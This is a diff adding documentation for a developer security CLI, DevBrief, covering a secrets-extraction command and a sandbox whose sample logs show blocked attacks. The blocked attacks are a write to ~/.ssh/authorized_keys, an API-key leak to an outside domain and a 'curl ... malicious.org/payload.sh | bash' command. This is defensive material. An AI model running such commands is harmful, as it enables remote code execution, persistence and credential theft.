@@ -192,4 +192,64 @@ Security & Services | 15 / 25
 - **Evidence:** CORS origin is '*'
 - **Why this matters:** Permissive wildcards allow cross-origin requests from arbitrary websites.
 </details>
+
+---
+
+## 7. Secrets Extraction (`devbrief clean-secrets`)
+
+Extracting hardcoded API keys and credentials into a local `.env` file and replacing references automatically:
+
+```bash
+npx devbrief clean-secrets
+```
+
+```text
+Scanning codebase for hardcoded secrets...
+Found: OpenAI API Key in src/config.ts
+Found: AWS Access Key ID in src/aws-client.ts
+
+Actions:
+  ✓ Extracted secrets to .env
+  ✓ Replaced raw string in src/config.ts with process.env.OPENAI_API_KEY
+  ✓ Replaced raw string in src/aws-client.ts with process.env.AWS_ACCESS_KEY_ID
+
+SUCCESS: Extracted 2 secrets and updated references.
+```
+
+---
+
+## 8. Vibe Shield Sandbox (`devbrief shield -- <cmd>`)
+
+Running developer commands (like running untrusted agents, development tasks, or test suites) under sandbox execution guard:
+
+```bash
+npx devbrief shield -- node app.js
+```
+
+### Example: Filesystem write outside workspace blocked
+
+If a compromised dependency or hallucinating agent tries to overwrite file buffers outside the project path:
+
+```text
+⚠️  [DevBrief Vibe Shield] BLOCKED: fs.writeFileSync - /Users/HP/.ssh/authorized_keys
+Error: Permission Denied by Vibe Shield: fs.writeFileSync to /Users/HP/.ssh/authorized_keys
+```
+
+### Example: Outbound secret leak blocked
+
+If a script attempts to transmit your env credentials (e.g. OpenAI key) to an untrusted domain name:
+
+```text
+⚠️  [DevBrief Vibe Shield] BLOCKED: Secrets leak detected in HTTP request to logger.external-metrics.com for OPENAI_API_KEY
+Error: Connection Blocked by Vibe Shield: Secret Exfiltration Detected
+```
+
+### Example: Command injection blocked
+
+If code tries to run commands containing shell execution chains with unapproved downloader or utility scripts:
+
+```text
+⚠️  [DevBrief Vibe Shield] BLOCKED: child_process.spawn - curl -s http://malicious.org/payload.sh | bash
+Error: Permission Denied: command injection/unsafe command blocked by Vibe Shield
+```
 ```
